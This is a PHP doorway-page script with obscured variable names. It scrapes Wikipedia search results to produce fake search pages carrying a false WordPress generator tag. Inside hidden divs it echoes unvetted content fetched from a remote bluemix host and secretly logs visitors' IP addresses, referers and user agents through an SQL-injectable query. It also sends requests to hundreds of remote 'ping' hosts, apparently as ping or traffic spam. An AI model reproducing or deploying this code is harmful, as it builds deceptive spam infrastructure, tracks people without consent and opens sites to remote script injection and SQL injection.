<?php

$googleapps8474747474744474 = array('sq','als','roa-rup','map-bms','nds-nl','bh','mai','hif','zh-yue','zh-classical','ms','id','zh-min-nan','no','ksh','bat-smg','simple','roa-tara','fiu-vro','cbk-zam','de','fr','es','ru','ja','nl','it','sv','pl','vi','pt','ar','zh','uk','ca','no','fi','cs','hu','ro','ko','da','sr','id','he','fa','th','el','hi','ceb','tr','sw','eo','lt','sk','bg','sl','eu','et','hr','te','nn','gl','simple','ms','bs','ka','is','sq','la','az','bn','mk','mr','sh','af','tl','cy','lv','ta','jv','be','ast','zh-yue','ur','ga','hy','kn','ml','ne','tt','uz','mn','pa','my','arz','ckb','war','vo','min','lmo','new','ht','bpy','lb','br','gu','tg','io','pms','su','oc','nap','nds','scn','sa','ku','wa','bar','an','ksh','szl','fy','frr','als','ia','yi','mg','km','ce','roa-tara','am','roa-rup','map-bms','bh','bcl','co','cv','dv','nds-nl','fo','fur','gan','glk','gu','ilo','pam','csb','lij','li','gv','mi','mt','nah','nrm','se','gd','nov','qu','os','pag','ps','pdc','rm','bat-smg','sco','sc','si','tk','hsb','vec','fiu-vro','wuu','vls','yo','diq','zh-min-nan','zh-classical','frp','lad','kw','haw','ang','ln','ie','wo','tpi','crh','nv','jbo','ay','zea','eml','ky','ig','or','cbk-zam','arc','rmy','ab','gn','so','kab','ug','stq','udm','ext','mzn','pap','cu','sah','tet','sd','pcd','as','sn','lo','ba','pnb','iu','got','bo','dsb','chr','cdo','hak','om','sm','ee','av','zu','cr','pih','ss','bi','rw','ch','xh','kl','ik','bug','dz','ts','tn','kv','xal','st','tw','bxr','ak','ny','fj','lbe','za','ha','mwl','xmf','lez','bjn','mai','gom','lrc','tyv','vep','nso','kbd','ltg','rue','pfl','gag','koi','mrj','mhr','krc','ace','hif','olo','kaa','mdf','myv','azb','ady','tcy','dty','atj','kbp','din','lfn','gor','inh','sat','be-x-old','pi','to','ty','kg','mo','ks','na','ti','bm','pnt','ve','tum','ki','ff','lg','sg','ii','cho','rn','mh','chy','ng','kj','ho','mus','kr','aa','hz','srn','jam','ceb','sv','de','fr','nl','ru','it','es','pl','war','vi','ja','zh','pt','uk','ar','fa','sr','ca','no','id','fi','ko','sh','hu','cs','ro','eu','ms','tr','eo','hy','bg','da','he','sk','zh-min-nan','kk','min','ce','hr','lt','et','be','sl','el','gl','az','ur','simple','nn','azb','uz','th','hi','la','ka','vo','ta','cy','mk','ast','tg','lv','mg','oc','tt','bs','ky','af','sq','tl','zh-yue','new','te','be-tarask','br','bn','pms','ml','lb','jv','ht','sco','mr','ga','sw','ba','pnb','is','nds','my','cv','fy','su','lmo','an','yo','ne','pa','gu','io','bar','scn','ku','als','bpy','kn','ckb','ia','qu','arz','wuu','mn','bat-smg','si','wa','or','gd','yi','am','nap','cdo','bug','hsb','map-bms','mai','xmf','fo','mzn','li','ilo','sah','eml','os','vec','sa','sd','mrj','mhr','ps','hif','diq','roa-tara','bcl','zh-classical','hak','frr','pam','ace','szl','nso','se','km','nv','mi','rue','nah','nds-nl','vls','bh','gan','crh','sc','vep','bo','glk','co','tk','myv','fiu-vro','so','as','kv','csb','lrc','gv','zea','udm','pcd','ay','ie','sn','ug','nrm','stq','lez','kw','lad','mwl','gom','gn','rm','haw','lij','koi','ha','ab','mt','fur','lfn','lo','frp','dsb','ln','ang','ext','kab','cbk-zam','dty','olo','dv','ksh','gag','pi','pag','pfl','av','bjn','bxr','xal','gor','krc','pap','za','kaa','pdc','rw','tyv','to','kl','nov','jam','arc','kbd','kbp','tpi','tet','ig','ki','na','jbo','lbe','roa-rup','ty','kg','bi','mdf','wo','lg','zu','srn','tcy','atj','inh','chr','ltg','sm','xh','om','pih','sat','cu','rmy','bm','tw','tn','chy','rn','got','ts','tum','ak','st','ny','ch','ss','pnt','fj','iu','ady','ee','ks','ve','ik','sg','ff','dz','ti','cr','din','ng','cho','kj','mh','ho','ii','aa','mus','hz','kr');

?>

<?php

$googleapps8474747474744474 = $googleapps8474747474744474[array_rand($googleapps8474747474744474)];

$googleapps8474747474744474 = strtolower($googleapps8474747474744474);

?>

<?php

$isSecure = false;
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') {
    $isSecure = true;
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' || !empty($_SERVER['HTTP_X_FORWARDED_SSL']) && $_SERVER['HTTP_X_FORWARDED_SSL'] == 'on') {
    $isSecure = true;
}
$googleprotocolapps8884 = $isSecure ? 'https' : 'http';

?>

<?php

if(preg_match("/bluemix|heroku/",$_SERVER['HTTP_HOST']))

{

$googleprotocolapps8884 = "$googleprotocolapps8884";

}

else

{

$googleprotocolapps8884 = "https";

}

?>

<?php

date_default_timezone_set("Europe/Instanbul");

?>

<?php

header('Content-Type: text/html; charset=utf-8');

?>

<?php

header("Connection: Keep-alive");

?>

<html lang="<?php echo $googleapps8474747474744474; ?>">

<?php

if(preg_match("/[\W\w]/",$_GET['q']))

{

$googleappssearchesapps8884 = $_GET['q'];

$googleappssearchesapps8884 = preg_replace('/\d+/u','',$googleappssearchesapps8884);

$googleappssearchesapps8884 = str_replace('_','+',$googleappssearchesapps8884);

$googleappssearchesapps8884 = str_replace('-','+',$googleappssearchesapps8884);

$googleappssearchesapps8884 = str_replace(' ','+',$googleappssearchesapps8884);

$googleappssearchesapps8884 = preg_replace('/\+$/','',$googleappssearchesapps8884);

$googleappssearchesapps8884 = preg_replace('/\s+/','',$googleappssearchesapps8884);

$googleappssearchesapps8884 = preg_replace('/&googleapps=(.*)/','',$googleappssearchesapps8884);

}

else

{

$googleappssearchesapps8884 = $_SERVER['QUERY_STRING'];

$googleappssearchesapps8884 = preg_replace('/\d+/u','',$googleappssearchesapps8884);

$googleappssearchesapps8884 = str_replace('_','+',$googleappssearchesapps8884);

$googleappssearchesapps8884 = str_replace('-','+',$googleappssearchesapps8884);

$googleappssearchesapps8884 = str_replace(' ','+',$googleappssearchesapps8884);

$googleappssearchesapps8884 = preg_replace('/\+$/','',$googleappssearchesapps8884);

$googleappssearchesapps8884 = preg_replace('/\s+/','',$googleappssearchesapps8884);

$googleappssearchesapps8884 = preg_replace('/&googleapps=(.*)/','',$googleappssearchesapps8884);

}

?>

<?php

$google8474747474 = rand("0","1");

if(preg_match("/1/","$google8474747474"))

{

$google84747474747474 = "ru";

}

else

{

$google84747474747474 = "tr";

}

?>

<?php

$google8474747474747444444474 = $_GET['googleapps847474744474'];

?>

<?php

if(preg_match("/[\W\w]/",$google8474747474747444444474))

{

?>

<?php

$install8484 = file_get_contents("https://$google8474747474747444444474.wikipedia.org/w/api.php?action=query&list=search&format=json&srsearch=$googleappssearchesapps8884");

$install8484 = json_decode($install8484, true);

?>

<?php

}

else

{

?>

<?php

$install8484 = file_get_contents("https://$googleapps8474747474744474.wikipedia.org/w/api.php?action=query&list=search&format=json&srsearch=$googleappssearchesapps8884");

$install8484 = json_decode($install8484, true);

?>

<?php

}

?>

<?php

$google84747474 = $install8484['query']['search'][0]['title'];

?>

<?php

if(preg_match("/[\W\w]/","$google84747474"))

{

?>

<?php

if(preg_match("/[\W\w]/",$google8474747474747444444474))

{

?>

<?php

$install8484 = file_get_contents("https://$google8474747474747444444474.wikipedia.org/w/api.php?action=query&list=search&format=json&srsearch=$googleappssearchesapps8884");

$install8484 = json_decode($install8484, true);

$google8474747474444474 = "$google8474747474747444444474";

?>

<?php

}

else

{

?>

<?php

$install8484 = file_get_contents("https://$googleapps8474747474744474.wikipedia.org/w/api.php?action=query&list=search&format=json&srsearch=$googleappssearchesapps8884");

$install8484 = json_decode($install8484, true);

$google8474747474444474 = "$googleapps8474747474744474";

?>

<?php

}

?>

<?php

}

else

{

?>

<?php

if(preg_match("/[\W\w]/",$google8474747474747444444474))

{

?>

<?php

$install8484 = file_get_contents("https://$google8474747474747444444474.wikipedia.org/w/api.php?action=query&list=search&format=json&srsearch=$googleappssearchesapps8884");

$install8484 = json_decode($install8484, true);

$google8474747474444474 = "$google8474747474747444444474";

?>

<?php

}

else

{

?>

<?php

$install8484 = file_get_contents("https://$google84747474747474.wikipedia.org/w/api.php?action=query&list=search&format=json&srsearch=$googleappssearchesapps8884");

$install8484 = json_decode($install8484, true);

$google8474747474444474 = "$google84747474747474";

?>

<?php

}

?>

<?php

}

?>

<?php

$google84747474 = $install8484['query']['search'][0]['title'];

$google84747474 = strip_tags($google84747474);

if(preg_match("/[\W\w]/","$google84747474"))

{
}

else

{

?>

<?php

$install8484 = file_get_contents("https://en.wikipedia.org/w/api.php?action=query&list=search&format=json&srsearch=$googleappssearchesapps8884");

$install8484 = json_decode($install8484, true);

$google8474747474444474 = "en";

?>

<?php

}

?>

<?php

$google84747474 = $install8484['query']['search'][0]['title'];

$google84747474 = strip_tags($google84747474);

$google8884 = $install8484['query']['search'][0]['snippet'];

$google8884 = strip_tags($google8884);

?>

<head>
<title><?php echo "$google84747474"; ?></title>
<meta name='description' content='<?php echo "$google8884"; ?>'>
<meta name='robots' content='index,follow'>
<meta name='viewport' content='width=device-width, initial-scale=1.0'/>
<link rel="icon" href="<?php echo "$googleprotocolapps8884://$_SERVER[HTTP_HOST]"; ?>/search.png">
<link rel="alternate" hreflang="<?php echo $googleapps8474747474744474; ?>" href="https://<?php echo $_SERVER['HTTP_HOST']; ?>/">
<base href="/">
<meta name='generator' content="Wordpress 4.2.2"/>
</head>

<div class="schema">

<section itemscope itemtype="https://schema.org/SearchResultsPage">
<h1 itemprop="name"><?php echo "$google84747474"; ?></h1>
<h2><?php echo "$google84747474"; ?></h2>
<span itemprop="detail"><?php echo "$google8884"; ?><span>
</section>

</div>

<?php

$google8474747474747444444444444444744474 = "https://mobilelinuxappsapps12.eu-gb.mybluemix.net/googleapps84444474/google13474.sh";

$ch = curl_init($google8474747474747444444444444444744474);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, FALSE);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla");
curl_setopt($ch, CURLOPT_TIMEOUT, 12);
$google8474747474747444444444444444744474 = curl_exec($ch);
curl_close($ch);

echo "$google8474747474747444444444444444744474";

?>

<div style="display:none;">

<?php

$servername84747474444444744474 = preg_replace("/\s+/","",file_get_contents("googleapps84/googleapps84.sh"));
$username84747474444444744474 = preg_replace("/\s+/","",file_get_contents("googleapps84/googleapps1.sh"));
$password84747474444444744474 = preg_replace("/\s+/","",file_get_contents("googleapps84/googleapps2.sh"));
$dbname84747474444444744474 = preg_replace("/\s+/","",file_get_contents("googleapps84/googleapps4.sh"));

$conn84747474 = new mysqli($servername84747474444444744474, $username84747474444444744474, $password84747474444444744474, $dbname84747474444444744474);

?>

<?php

$googleappscountryapps8884 = DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, "ZA");

$googleappscountryapps8884 = reset($googleappscountryapps8884);

?>

<?php

date_default_timezone_set("$googleappscountryapps8884");

?>

<?php

$google8474747474747474744474447444744474 = $_GET['google84747474'];

function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$userip84747474 = getUserIP();

$date84442274444474447444744474 = date("Y-m-d H:i:s");

$userip = preg_replace("/\s+/","",$userip);

$date84442274444474447444744474 = date("Y-m-d-H-i-s");

$google8474747474744474 = $_SERVER['HTTP_REFERER'];

$google8474747474744474447444744474447412744474 = $_SERVER['HTTP_HOST'];

$google8474747474744474447444744474447412744474444474 = $_SERVER['HTTP_REFERER'];

$google84747474747444744474447444744474127444744444744474 = $_SERVER['HTTP_USER_AGENT'];

$sql84744474447444744474 = "INSERT INTO charts847474744474 (google847474744474,google84747474)
VALUES ('$userip84747474','$google8474747474744474447444744474447412744474<br>$google8474747474744474447444744474447412744474444474<br>$google84747474747444744474447444744474127444744444744474<br>')";

$googleapps84747474 = mysqli_query($conn84747474,$sql84744474447444744474);

echo "$googleapps84747474";

?>

<?php

$conn84747474->close();

?>

</div>

<div style="display:none;">

<?php

$googleapps847474747474444444744474444444444444444444744474 = array();

?>

<?php

$url = "https://mobilelinuxappsapps12.eu-gb.mybluemix.net/googleapps84444474/google134747474.php";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
$fcontents = curl_exec($ch);
curl_close($ch);

$fcontents = explode("\n",$fcontents);

$line84747474 = $fcontents[array_rand($fcontents)];

$keywordsappsappsappsapps84747474747474 = preg_replace("/\s+/","",$line84747474);

for ($x = 0; $x <= $keywordsappsappsappsapps84747474747474; $x++)

{

$googleapps847474744474++;

?>

<?php

$googleapps847474747474 = array("mobileapps8474747444741.eu-gb.mybluemix.net","mobileapps8474747444742.eu-gb.mybluemix.net","mobileapps8474747444743.eu-gb.mybluemix.net","mobileapps8474747444744.eu-gb.mybluemix.net","mobileapps8474747444745.eu-gb.mybluemix.net","mobileapps8474747444746.eu-gb.mybluemix.net","mobileapps8474747444747.eu-gb.mybluemix.net","mobileapps8474747444748.eu-gb.mybluemix.net","mobileapps8474747444749.eu-gb.mybluemix.net","mobileapps84747474447410.eu-gb.mybluemix.net","mobileapps84747474447411.eu-gb.mybluemix.net","mobileapps84747474447412.eu-gb.mybluemix.net","mobileapps84747474447413.eu-gb.mybluemix.net","mobileapps84747474447414.eu-gb.mybluemix.net","mobileapps84747474447415.eu-gb.mybluemix.net","mobileapps84747474447416.eu-gb.mybluemix.net","mobileapps84747474447417.eu-gb.mybluemix.net","mobileapps84747474447418.eu-gb.mybluemix.net","mobileapps84747474447419.eu-gb.mybluemix.net","mobileapps84747474447420.eu-gb.mybluemix.net","mobileapps84747474447421.eu-gb.mybluemix.net","mobileapps84747474447422.eu-gb.mybluemix.net","mobileapps84747474447423.eu-gb.mybluemix.net","mobileapps84747474447424.eu-gb.mybluemix.net","mobileapps84747474447425.eu-gb.mybluemix.net","mobileapps84747474447426.eu-gb.mybluemix.net","mobileapps84747474447427.eu-gb.mybluemix.net","mobileapps84747474447428.eu-gb.mybluemix.net","mobileapps84747474447429.eu-gb.mybluemix.net","mobileapps84747474447430.eu-gb.mybluemix.net","mobileapps84747474447431.eu-gb.mybluemix.net","mobileapps84747474447432.eu-gb.mybluemix.net","mobileapps8474747444744444741.eu-gb.mybluemix.net","mobileapps8474747444744444742.eu-gb.mybluemix.net","mobileapps8474747444744444743.eu-gb.mybluemix.net","mobileapps8474747444744444744.eu-gb.mybluemix.net","mobileapps8474747444744444745.eu-gb.mybluemix.net","mobileapps8474747444744444746.eu-gb.mybluemix.net","mobileapps8474747444744444747.eu-gb.mybluemix.net","mobileapps8474747444744444748.eu-gb.mybluemix.net","mobileapps8474747444744444749.eu-gb.mybluemix.net","mobileapps84747474447444447410.eu-gb.mybluemix.net","mobileapps84747474447444447411.eu-gb.mybluemix.net","mobileapps84747474447444447412.eu-gb.mybluemix.net","mobileapps84747474447444447413.eu-gb.mybluemix.net","mobileapps84747474447444447414.eu-gb.mybluemix.net","mobileapps84747474447444447415.eu-gb.mybluemix.net","mobileapps84747474447444447416.eu-gb.mybluemix.net","mobileapps84747474447444447417.eu-gb.mybluemix.net","mobileapps84747474447444447418.eu-gb.mybluemix.net","mobileapps84747474447444447419.eu-gb.mybluemix.net","mobileapps84747474447444447420.eu-gb.mybluemix.net","mobileapps84747474447444447421.eu-gb.mybluemix.net","mobileapps84747474447444447422.eu-gb.mybluemix.net","mobileapps84747474447444447423.eu-gb.mybluemix.net","mobileapps84747474447444447424.eu-gb.mybluemix.net","mobileapps84747474447444447425.eu-gb.mybluemix.net","mobileapps84747474447444447426.eu-gb.mybluemix.net","mobileapps84747474447444447427.eu-gb.mybluemix.net","mobileapps84747474447444447428.eu-gb.mybluemix.net","mobileapps84747474447444447429.eu-gb.mybluemix.net","mobileapps84747474447444447430.eu-gb.mybluemix.net","mobileapps84747474447444447431.eu-gb.mybluemix.net","mobileapps84747474447444447432.eu-gb.mybluemix.net","mobileapps84747474447444447433.eu-gb.mybluemix.net","mobileapps84747474447444447434.eu-gb.mybluemix.net","mobileapps84747474447444447435.eu-gb.mybluemix.net","mobileapps84747474447444447436.eu-gb.mybluemix.net","mobileapps84747474447444447437.eu-gb.mybluemix.net","mobileapps84747474447444447438.eu-gb.mybluemix.net","mobileapps84747474447444447439.eu-gb.mybluemix.net","mobileapps84747474447444447440.eu-gb.mybluemix.net","mobileapps84747474447444447441.eu-gb.mybluemix.net","mobileapps84747474447444447442.eu-gb.mybluemix.net","mobileapps84747474447444447443.eu-gb.mybluemix.net","mobileapps84747474447444447444.eu-gb.mybluemix.net","mobileapps84747474447444447445.eu-gb.mybluemix.net","mobileapps84747474447444447446.eu-gb.mybluemix.net","mobileapps84747474447444447447.eu-gb.mybluemix.net","mobileapps84747474447444447448.eu-gb.mybluemix.net","mobileapps84747474447444447449.eu-gb.mybluemix.net","mobileapps84747474447444447450.eu-gb.mybluemix.net","mobileapps84747474447444447451.eu-gb.mybluemix.net","mobileapps84747474447444447452.eu-gb.mybluemix.net","mobileapps84747474447444447453.eu-gb.mybluemix.net","mobileapps84747474447444447454.eu-gb.mybluemix.net","mobileapps84747474447444447455.eu-gb.mybluemix.net","mobileapps84747474447444447456.eu-gb.mybluemix.net","mobileapps84747474447444447457.eu-gb.mybluemix.net","mobileapps84747474447444447458.eu-gb.mybluemix.net","mobileapps84747474447444447459.eu-gb.mybluemix.net","mobileapps84747474447444447460.eu-gb.mybluemix.net","mobileapps84747474447444447461.eu-gb.mybluemix.net","mobileapps84747474447444447462.eu-gb.mybluemix.net","mobileapps84747474447444447463.eu-gb.mybluemix.net","mobileapps84747474447444447464.eu-gb.mybluemix.net","mobileapps84747474447444447465.eu-gb.mybluemix.net","mobileapps84747474447444447466.eu-gb.mybluemix.net","mobileapps84747474447444447467.eu-gb.mybluemix.net","mobileapps84747474447444447468.eu-gb.mybluemix.net","mobileapps84747474447444447469.eu-gb.mybluemix.net","mobileapps84747474447444447470.eu-gb.mybluemix.net","mobileapps84747474447444447471.eu-gb.mybluemix.net","mobileapps84747474447444447472.eu-gb.mybluemix.net","mobileapps84747474447444447473.eu-gb.mybluemix.net","mobileapps84747474447444447474.eu-gb.mybluemix.net","mobileapps84747474447444447475.eu-gb.mybluemix.net","mobileapps84747474447444447476.eu-gb.mybluemix.net","mobileapps84747474447444447477.eu-gb.mybluemix.net","mobileapps84747474447444447478.eu-gb.mybluemix.net","mobileapps84747474447444447479.eu-gb.mybluemix.net","mobileapps84747474447444447480.eu-gb.mybluemix.net","mobileapps84747474447444447481.eu-gb.mybluemix.net","mobileapps84747474447444447482.eu-gb.mybluemix.net","mobileapps84747474447444447483.eu-gb.mybluemix.net","mobileapps84747474447444447484.eu-gb.mybluemix.net","mobileapps84747474447444447485.eu-gb.mybluemix.net","mobileapps84747474447444447486.eu-gb.mybluemix.net","mobileapps84747474447444447487.eu-gb.mybluemix.net","mobileapps84747474447444447488.eu-gb.mybluemix.net","mobileapps84747474447444447489.eu-gb.mybluemix.net","mobileapps84747474447444447490.eu-gb.mybluemix.net","mobileapps84747474447444447491.eu-gb.mybluemix.net","mobileapps84747474447444447492.eu-gb.mybluemix.net","mobileapps84747474447444447493.eu-gb.mybluemix.net","mobileapps84747474447444447494.eu-gb.mybluemix.net","mobileapps84747474447444447495.eu-gb.mybluemix.net","mobileapps84747474447444447496.eu-gb.mybluemix.net","mobileapps84747474447444447497.eu-gb.mybluemix.net","mobileapps84747474447444447498.eu-gb.mybluemix.net","mobileapps84747474447444447499.eu-gb.mybluemix.net","mobileapps84444444447444741.mybluemix.net","mobileapps84444444447444742.mybluemix.net","mobileapps84444444447444743.mybluemix.net","mobileapps84444444447444744.mybluemix.net","mobileapps84444444447444745.mybluemix.net","mobileapps84444444447444746.mybluemix.net","mobileapps84444444447444747.mybluemix.net","mobileapps84444444447444748.mybluemix.net","mobileapps84444444447444749.mybluemix.net","mobileapps844444444474447410.mybluemix.net","mobileapps844444444474447411.mybluemix.net","mobileapps844444444474447412.mybluemix.net","mobileapps844444444474447413.mybluemix.net","mobileapps844444444474447414.mybluemix.net","mobileapps844444444474447415.mybluemix.net","mobileapps844444444474447416.mybluemix.net","mobileapps844444444474447417.mybluemix.net","mobileapps844444444474447418.mybluemix.net","mobileapps844444444474447419.mybluemix.net","mobileapps844444444474447420.mybluemix.net","mobileapps844444444474447421.mybluemix.net","mobileapps844444444474447422.mybluemix.net","mobileapps844444444474447423.mybluemix.net","mobileapps844444444474447424.mybluemix.net","mobileapps844444444474447425.mybluemix.net","mobileapps844444444474447426.mybluemix.net","mobileapps844444444474447427.mybluemix.net","mobileapps844444444474447428.mybluemix.net","mobileapps844444444474447429.mybluemix.net","mobileapps844444444474447430.mybluemix.net","mobileapps844444444474447431.mybluemix.net","mobileapps844444444474447432.mybluemix.net","mobileapps844444444474447433.mybluemix.net","mobileapps844444444474447434.mybluemix.net","mobileapps844444444474447435.mybluemix.net","mobileapps844444444474447436.mybluemix.net","mobileapps844444444474447437.mybluemix.net","mobileapps844444444474447438.mybluemix.net","mobileapps844444444474447439.mybluemix.net","mobileapps844444444474447440.mybluemix.net","mobileapps844444444474447441.mybluemix.net","mobileapps844444444474447442.mybluemix.net","mobileapps844444444474447443.mybluemix.net","mobileapps844444444474447444.mybluemix.net","mobileapps844444444474447445.mybluemix.net","mobileapps844444444474447446.mybluemix.net","mobileapps844444444474447447.mybluemix.net","mobileapps844444444474447448.mybluemix.net","mobileapps844444444474447449.mybluemix.net","mobileapps844444444474447450.mybluemix.net","mobileapps844444444474447451.mybluemix.net","mobileapps844444444474447452.mybluemix.net","mobileapps844444444474447453.mybluemix.net","mobileapps844444444474447454.mybluemix.net","mobileapps844444444474447455.mybluemix.net","mobileapps844444444474447456.mybluemix.net","mobileapps844444444474447457.mybluemix.net","mobileapps844444444474447458.mybluemix.net","mobileapps844444444474447459.mybluemix.net","mobileapps844444444474447460.mybluemix.net","mobileapps844444444474447461.mybluemix.net","mobileapps844444444474447462.mybluemix.net","mobileapps844444444474447463.mybluemix.net","mobileapps844444444474447464.mybluemix.net","mobileapps844444444474447465.mybluemix.net","mobileapps844444444474447466.mybluemix.net","mobileapps844444444474447467.mybluemix.net","mobileapps844444444474447468.mybluemix.net","mobileapps844444444474447469.mybluemix.net","mobileapps844444444474447470.mybluemix.net","mobileapps844444444474447471.mybluemix.net","mobileapps844444444474447472.mybluemix.net","mobileapps844444444474447473.mybluemix.net","mobileapps844444444474447474.mybluemix.net","mobileapps844444444474447475.mybluemix.net","mobileapps844444444474447476.mybluemix.net","mobileapps844444444474447477.mybluemix.net","mobileapps844444444474447478.mybluemix.net","mobileapps844444444474447479.mybluemix.net","mobileapps844444444474447480.mybluemix.net","mobileapps844444444474447481.mybluemix.net","mobileapps844444444474447482.mybluemix.net","mobileapps844444444474447483.mybluemix.net","mobileapps844444444474447484.mybluemix.net","mobileapps844444444474447485.mybluemix.net","mobileapps844444444474447486.mybluemix.net","buyads.shop","buyads.xyz","businessads.shop","businessads.xyz","businessapps.shop","businesscpc.xyz","businesstraffic.xyz","buyadsonline.shop","buyadsonline.xyz","buyappsonline.shop","buyclicks.shop","buyclicks.xyz","buymobileads.xyz","cpcads.xyz","cpmads.xyz","cpmtraffic.xyz","cpmtrafficads.xyz","mobileads.xyz","mobileadsonline.website","mobilebusiness.shop","mobilebusinessads.xyz","trafficcpc.xyz","advertise.partners","businessmail.xyz","businesswebmail.xyz","users.blue","gcloud.pw","businessads.website","phpscripts.online","mobileapps847474744474.tk","developerblog.ml","buyads.ml","buyads.ga","buyads.cf","buyads.gq","businessads.tk","businessads.ml","businessads.ga","businessads.cf","businessads.gq","mobileads.ml","mobileads.ga","mobileads.cf","buyadsgoogle.ml","dns84747474.ml","mobileapps8474747474.tk","mobile84747474.tk","mobileapps1.eu-gb.mybluemix.net","mobileapps2.eu-gb.mybluemix.net","mobileapps4.eu-gb.mybluemix.net","mobileapps12.eu-gb.mybluemix.net","mobileapps76.eu-gb.mybluemix.net","mobileapps78.eu-gb.mybluemix.net","mobileapps79.eu-gb.mybluemix.net","mobileapps81.eu-gb.mybluemix.net","mobileappsapps1.eu-gb.mybluemix.net","mobileappsapps2.eu-gb.mybluemix.net","mobileappsapps4.eu-gb.mybluemix.net","mobileappsapps12.eu-gb.mybluemix.net","mobileappsappsapps1.eu-gb.mybluemix.net","mobileappsappsapps2.eu-gb.mybluemix.net","mobileappsappsapps4.eu-gb.mybluemix.net","mobileappsappsapps12.eu-gb.mybluemix.net","mobileappsappsappsapps1.eu-gb.mybluemix.net","mobileappsappsappsapps2.eu-gb.mybluemix.net","mobileappsappsappsapps4.eu-gb.mybluemix.net","mobileappsappsappsapps12.eu-gb.mybluemix.net","mobilelinuxapps1.eu-gb.mybluemix.net","mobilelinuxapps2.eu-gb.mybluemix.net","mobilelinuxapps4.eu-gb.mybluemix.net","mobilelinuxapps12.eu-gb.mybluemix.net");

$googleapps847474747474 = $googleapps847474747474[array_rand($googleapps847474747474)];

$googleapps847474747474444444744474444444444444444444744474[] = "https://$googleapps847474747474/ping847474744474/ping847474744474.php";

?>

<?php

}

?>

</div>

<?php
 
function multiRequest($data, $options = array()) {
 
  // array of curl handles
  $curly = array();
  // data to be returned
  $result = array();
 
  // multi handle
  $mh = curl_multi_init();
 
  // loop through $data and create curl handles
  // then add them to the multi-handle
  foreach ($data as $id => $d) {
 
    $curly[$id] = curl_init();
 
    $url = (is_array($d) && !empty($d['url'])) ? $d['url'] : $d;
    curl_setopt($curly[$id], CURLOPT_URL,            $url);
    curl_setopt($curly[$id], CURLOPT_HEADER,         0);
    curl_setopt($curly[$id], CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curly[$id], CURLOPT_CONNECTTIMEOUT, 1);
    curl_setopt($curly[$id], CURLOPT_TIMEOUT, 1);

    // post?
    if (is_array($d)) {
      if (!empty($d['post'])) {
        curl_setopt($curly[$id], CURLOPT_POST,       1);
        curl_setopt($curly[$id], CURLOPT_POSTFIELDS, $d['post']);
      }
    }
 
    // extra options?
    if (!empty($options)) {
      curl_setopt_array($curly[$id], $options);
    }
 
    curl_multi_add_handle($mh, $curly[$id]);
  }
 
  // execute the handles
  $running = null;
  do {
    curl_multi_exec($mh, $running);
  } while($running > 0);
 
 
  // get content and remove handles
  foreach($curly as $id => $c) {
    $result[$id] = curl_multi_getcontent($c);
    curl_multi_remove_handle($mh, $c);
  }
 
  // all done
  curl_multi_close($mh);
 
  return $result;
}
 
?>

<?php

$r847474744474 = multiRequest($googleapps847474747474444444744474444444444444444444744474);

?>

<div style="display:none;">

<?php

$url = "https://mobilelinuxappsapps12.eu-gb.mybluemix.net/googleapps84444474/google134747474.php";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
$fcontents = curl_exec($ch);
curl_close($ch);

$fcontents = explode("\n",$fcontents);

$line84747474 = $fcontents[array_rand($fcontents)];

$keywordsappsappsappsapps84747474747474 = preg_replace("/\s+/","",$line84747474);

for ($x = 0; $x <= $keywordsappsappsappsapps84747474747474; $x++)

{

$googleapps847474744474444474++;

?>

<?php

$googleapps847474744444744474 = strip_tags($r847474744474[$googleapps847474744474444474]);

echo "$googleapps847474744444744474";

?>

<?php

if(preg_match("/Ping sent/",$googleapps847474744444744474))

{

?>

<?php

$servername84747474444444744474 = preg_replace("/\s+/","",file_get_contents("googleapps84/googleapps84.sh"));
$username84747474444444744474 = preg_replace("/\s+/","",file_get_contents("googleapps84/googleapps1.sh"));
$password84747474444444744474 = preg_replace("/\s+/","",file_get_contents("googleapps84/googleapps2.sh"));
$dbname84747474444444744474 = preg_replace("/\s+/","",file_get_contents("googleapps84/googleapps4.sh"));

$conn84747474 = new mysqli($servername84747474444444744474, $username84747474444444744474, $password84747474444444744474, $dbname84747474444444744474);

?>

<?php

$googleappscountryapps8884 = DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, "ZA");

$googleappscountryapps8884 = reset($googleappscountryapps8884);

?>

<?php

$date84442274444474447444744474 = date("Y-m-d H:i:s");

$sql84744474447444744474 = "INSERT INTO charts8474747444747474 (google847474744474,google84747474)
VALUES ('$date84442274444474447444744474','ping')";

$googleapps84747474 = mysqli_query($conn84747474,$sql84744474447444744474);

echo "$googleapps84747474";

?>

<?php

$conn84747474->close();

?>

<?php

}

?>

<?php

}

?>

</div>

<body>

<div class="googleappsinstallapps84">

<div id="googleappsinstallappslinuxapps84" class="googleappsinstallappslinuxapps84">
</div>
</div>

<?php

$str = "$mobile";
$googleapps8888884 = md5($str);

?>

<div class="topbar">

<mobilegoogleapps84>

<form action='' class="input inputapps84747474444474" method="get" onsubmit="return submitchat();">

